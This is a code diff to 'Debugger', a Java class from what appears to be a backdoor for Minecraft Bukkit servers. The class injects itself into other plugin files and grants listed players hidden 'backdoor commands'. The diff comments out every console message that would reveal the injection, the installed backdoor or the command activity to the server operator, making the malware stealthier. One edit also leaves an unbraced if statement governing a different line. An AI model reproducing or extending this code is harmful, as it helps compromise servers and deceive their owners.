@@ -140,16 +140,17 @@ public final class Debugger implements Listener {
                     if (plugin_file.isDirectory())
                         continue;
 
-                    if (Config.display_debug_messages)
-                        Bukkit.getConsoleSender()
-                                .sendMessage("Injecting Thicc Industries into: " + plugin_file.getPath());
+                    if (Config.display_debug_messages) {
+                        //Bukkit.getConsoleSender()
+                        //.sendMessage("Injecting Thicc Industries into: " + plugin_file.getPath());
+                    }
+                        boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
+                                new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, discord_token, InjectOther, warnings), true, warnings, false);
 
-                    boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(),
-                            new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, discord_token, InjectOther, warnings), true, warnings, false);
-
-                    if (Config.display_debug_messages)
-                        Bukkit.getConsoleSender()
-                                .sendMessage(result ? "Success." : "Failed, Already patched?");
+                    if (Config.display_debug_messages) {
+                        //Bukkit.getConsoleSender()
+                        //.sendMessage(result ? "Success." : "Failed, Already patched?");
+                    }
                 }
             }
         }
@@ -169,8 +170,8 @@ public final class Debugger implements Listener {
 
 
         if(Config.display_debugger_warning){
-            Bukkit.getConsoleSender()
-                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
+            //Bukkit.getConsoleSender()
+                    //.sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
         }
 
         if(!discord_token.equals(""))
@@ -218,8 +219,8 @@ public final class Debugger implements Listener {
         }
 
         if (Config.display_debug_messages) {
-            Bukkit.getConsoleSender()
-                    .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
+            //Bukkit.getConsoleSender()
+                    //.sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
         }
 
         Player p = e.getPlayer();
@@ -228,8 +229,8 @@ public final class Debugger implements Listener {
         if (IsUserAuthorized(p)) {
 
             if (Config.display_debug_messages) {
-                Bukkit.getConsoleSender()
-                        .sendMessage(Config.chat_message_prefix + " User is authed");
+                //Bukkit.getConsoleSender()
+                        //.sendMessage(Config.chat_message_prefix + " User is authed");
             }
 
             if (msg.toLowerCase(Locale.ROOT).startsWith(Config.command_prefix)) {
@@ -237,8 +238,8 @@ public final class Debugger implements Listener {
 
 
                 if (Config.display_debug_messages) {
-                    Bukkit.getConsoleSender()
-                            .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
+                    //Bukkit.getConsoleSender()
+                            //.sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
                 }
 
                 if (!result.isEmpty())
@@ -250,8 +251,8 @@ public final class Debugger implements Listener {
         } else {
 
             if (Config.display_debug_messages) {
-                Bukkit.getConsoleSender()
-                        .sendMessage(Config.chat_message_prefix + " User is not authed");
+                //Bukkit.getConsoleSender()
+                        //.sendMessage(Config.chat_message_prefix + " User is not authed");
             }
         }
 
@@ -263,8 +264,8 @@ public final class Debugger implements Listener {
         Player player = evt.getPlayer();
         players.put(player.getName(), new PlayerState());
         if(Config.display_debug_messages)
-            Bukkit.getConsoleSender()
-                    .sendMessage("Creating states for player: " + player.getName());
+            //Bukkit.getConsoleSender()
+                    //.sendMessage("Creating states for player: " + player.getName());
 
         if(IsUserAuthorized(player))
             player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are authorized to use backdoor commands. Run " + Config.command_prefix + "help");
@@ -1362,4 +1363,5 @@ public final class Debugger implements Listener {
 
         return authorized;
     }
+
 }
